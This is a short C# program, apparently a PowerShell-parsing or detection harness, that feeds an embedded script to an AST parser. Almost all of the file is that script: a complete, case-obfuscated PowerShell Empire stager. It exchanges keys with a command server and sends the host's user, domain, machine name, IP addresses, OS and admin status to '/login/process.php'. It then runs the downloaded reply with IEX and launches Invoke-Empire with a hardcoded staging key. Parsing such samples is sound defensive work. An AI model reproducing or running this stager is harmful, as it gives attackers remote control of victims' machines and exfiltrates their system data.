using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Diagnostics;

using System.Management.Automation;
using System.Management.Automation.Language;
using System.Collections.ObjectModel;

using TraceEvent2.PowerShellInteract;

namespace PowerShellInteract
{
    class Program
    {
        static void Main(string[] args)
        {

            //PowershellInstance ps = new PowershellInstance();

            String code = @"FuNcTioN StART-NegotiATe {paRAM($s,$SK,$UA='MoziLLA / 5.0(WiNdowS NT 6.1; WOW64; TrIDENt / 7.0; RV: 11.0) LIkE GECko')fUNctiON COnVErTTO-RC4BYTEStreAm {PaRam ($RCK, $In)BeGin {[BytE[]] $STr = 0..255;$J = 0;0..255 | ForEaCh-OBjECT {$J = ($J + $StR[$_] + $RCK[$_ % $RCK.LENgtH]) % 256;$STR[$_], $STr[$J] = $STR[$J], $STr[$_];};$I = $J = 0;}pRoCeSs {FOrEacH($Byte In $IN) {$I = ($I + 1) % 256;$J = ($J + $Str[$I]) % 256;$StR[$I], $Str[$J] = $StR[$J], $Str[$I];$BYte -BxoR $Str[($STR[$I] + $STR[$J]) % 256];}}}FuNCtiON DeCrYPT-ByTeS {paraM ($Key, $IN)iF($IN.LENGth -gt 32) {$HMAC = New-OBJEcT SYsTEm.SEcUritY.CrYptOGrapHY.HMACSHA256;$E=[SYsTEm.TExt.EnCoDiNg]::ASCII;$Mac = $In[-10..-1];$IN = $In[0..($In.LengTh - 11)];$HmaC.KeY = $E.GETBYTeS($KeY);$EXpecTeD = $hmAC.COMPuTeHAsh($IN)[0..9];IF (@(COmpARE-ObJECT $MaC $ExpeCTEd -SyNC 0).LeNgth -ne 0) {RETuRN;}$IV = $IN[0..15];tRY {$AES=NEW-OBJECT SystEM.SeCuRIty.CryPTOgraphY.AEsCrYPtOServiCePROVidEr;}CatcH {$AES=New-OBjEct SYstem.SecUrItY.CRYPtogRaPhy.RIJndaELManagED;}$AES.Mode = 'CBC';$AES.Key = $e.GEtBYtEs($KEy);$AES.IV = $IV;($AES.CReaTEDEcRyptoR()).TRanSFoRMFINalBLOcK(($IN[16..$In.LENGTH]), 0, $IN.LeNgth-16)}}$Null = [Reflection.Assembly]::LoadWithPartialName('System.Security');$Null = [Reflection.Assembly]::LoadWithPartialName('System.Core');$ErrorActionPreference = 'SilentlyContinue';$e=[SysTem.TeXt.ENcODING]::ASCII;$customHeaders = '';$SKB=$e.GETBYTES($SK);TRY {$AES=NEw-Object SySTeM.SECurIty.CRYPtOGRAPHY.AESCRyPToSERvIcEPROvideR;}CaTCh {$AES=New-ObjecT SysTEm.SECUritY.CrYPTograPhY.RijnDaeLMaNageD;}$IV = [BYTe] 0..255 | GEt-RanDom -cOUnt 16;$AES.Mode='CBC';$AES.Key=$SKB;$AES.IV = $IV;$HmAc = New-OBjecT SysteM.SECURItY.CryptoGRaphy.HMACSHA256;$HMaC.KEy = $SKB;$cSP = NEW-ObJEcT SYStEM.SecuRIty.CryPtogrAphY.CSpPARAmeters;$cSp.Flags = $cSP.FLAGs -bOR [SYsTeM.SECuRItY.CrYptOgrAphY.CsPPrOvidERFlAgs]::USEMaChiNeKEYSTorE;$rs = NeW-OBjeCt SYSTem.SEcURiTy.CryPToGrApHy.RSACrypToSErVIcEPROvIdeR -ARGumenTLISt 2048,$csP;$rk=$rs.ToXmlSTRINg($FAlSe);$ID=-join('ABCDEFGHKLMNPRSTUVWXYZ123456789'.ToCharArray()|Get-Random -Count 8);$IB=$E.geTBytES($RK);$EB=$IV+$AES.CREATEEnCryPtOr().TranSFormFINaLBlOck($ib,0,$iB.LenGtH);$eB=$eB+$hMac.CoMpUtEHash($eB)[0..9];if(-NOT $wc) {$wC=NEW-ObJecT SySTEm.Net.WEBCliENT;$WC.PrOxy = [SYstEm.NET.WEBReQuest]::GeTSysTemWEBPROXY();$Wc.PRoXY.CRedeNtIaLs = [SyStEm.Net.CreDentialCache]::DefAULtCrEdeNtialS;}if ($ScriPT:ProxY) {$WC.PRoxY = $ScrIpt:PROxy;}if ($customHeaders -ne '') {$hEaDErs = $customHEADERs -SpLIt ',';$HEAderS | ForEaCH-ObjECt {$HeADERKeY = $_.sPlIt(':')[0];$heAdeRVaLUe = $_.SplIt(':')[1];if ($headerKey -eq 'host'){Try{$iG=$WC.DOWnlOADDAta($s)}CaTCH{}};$Wc.HeAdERs.ADD($HEaderKEy, $HEaDerVAlUe);}}$wc.Headers.Add('User - Agent',$UA);$IV=[BitConvERTer]::GEtByTES($(Get-RAndOm));$DaTa = $e.GEtbYtEs($ID) + @(0x01,0x02,0x00,0x00) + [BitCOnvERTeR]::GeTBYTEs($EB.LengtH);$RC4p = COnVeRtTO-RC4ByteSTREAM -RCK $($IV+$SKB) -In $Data;$rc4P = $IV + $rC4P + $EB;$raw=$wc.UploadData($s+' / login / process.php','POST',$rc4p);$De=$e.GEtSTRiNG($Rs.dECRYPt($RAw,$falSE));$NOnCe=$DE[0..15] -JoIN '';$key=$De[16..$de.LEngth] -jOiN '';$nOnCE=[STrING]([LonG]$nonCE + 1);trY {$AES=NEW-OBjEcT SySTEM.SEcURITy.CryPTOgRaPhy.AESCRyPtoSERvIcEPROVIdEr;}caTcH {$AES=NEw-OBJect SYSTem.SECUriTy.CRyPTOGrAPhY.RijNdaELManagEd;}$IV = [BytE] 0..255 | GET-RandoM -Count 16;$AES.Mode='CBC';$AES.KeY=$e.GEtBYTES($key);$AES.IV = $IV;$I=$nonCe+' | '+$s+' | '+[ENViRoNmenT]::UserDoMaINNamE+' | '+[ENViRONMent]::UsERNAMe+' | '+[ENVIrOnmENT]::MAcHIneNaME;TrY{$p=(GwmI Win32_NetwORKADaPtERCOnfigURaTiON|WhErE{$_.IPADdReSS}|SElecT -EXPANd IPAdDreSs);}CatCH {$p = '[FAILED]'}$Ip = @{$True=$p[0];$fAlSe=$P}[$P.LengTH -Lt 6];if(!$Ip -OR $ip.TriM() -Eq '') {$iP='0.0.0.0'};$i+=' |$ip';TRy{$I+=' | '+(Get-WmiObJEct WIN32_OPERaTiNgSysteM).NamE.sPLit(' | ')[0];}CATCH{$I+=' | '+'[FAILED]'}if(([Environment]::UserName).ToLower() -eq 'system'){$i+=' | True'}else {$i += ' | ' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')}$n=[SYSteM.DiaGnOSTICS.PROceSs]::GeTCURREnTPROCESS();$I+=' | '+$n.PROcEsSName+' | '+$N.ID;$i += ' | powershell | ' + $PSVersionTable.PSVersion.Major;$iB2=$e.GetbytEs($i);$eB2=$IV+$AES.CReaTeEncRyPTor().TraNsfOrMFinAlBLOcK($IB2,0,$IB2.LeNgth);$hMAC.KEy = $E.GETByTEs($kEy);$eB2 = $eB2+$hMaC.COmpUteHaSh($EB2)[0..9];$IV2=[BiTCoNVerter]::GetByTes($(GeT-RAnDOM));$DAtA2 = $e.GeTbYtES($ID) + @(0X01,0X03,0X00,0x00) + [BitCoNvErtER]::GETBYTeS($EB2.LENgTh);$Rc4p2 = COnVertTO-RC4BYteStream -RCK $($IV2+$SKB) -In $daTa2;$rC4P2 = $IV2 + $RC4p2 + $Eb2;if ($customHeaders -ne '') {$HeaDErs = $cuStOMHeaDErS -SpLiT ',';$HeADERs | ForEacH-ObjecT {$hEadERKey = $_.SpLiT(':')[0];$heaDERVaLuE = $_.splIT(':')[1];if ($headerKey -eq 'host'){TRY{$IG=$WC.DowNlOadDATa($S)}cATcH{}};$Wc.HEADErs.Add($headErKEy, $heaDErValue);}}$wc.Headers.Add('User - Agent',$UA);$raw=$wc.UploadData($s+' / login / process.php','POST',$rc4p2);IEX $( $e.GeTStRInG($(DecrYPT-BytES -KEy $key -In $rAW)) );$AES=$Null;$s2=$NulL;$wC=$nuLL;$Eb2=$nulL;$RAW=$NuLL;$IV=$nUlL;$wC=$nuLL;$I=$nuLL;$ib2=$NulL;[GC]::ColLeCT();Invoke-Empire -Servers @(($s -split ' / ')[0..2] -join ' / ') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours 'WORKING_HOURS_REPLACE' -KillDate 'REPLACE_KILLDATE' -ProxySettings $Script:Proxy;}Start-Negotiate -s '$ser' -SK '4bde6a2795339b5fd913e710b232540e' -UA $u;";



            ASTParser ast = new ASTParser(code);
            ast.Parser();


#if DEBUG
            System.Diagnostics.Debugger.Break();
#endif
        }
    }
}
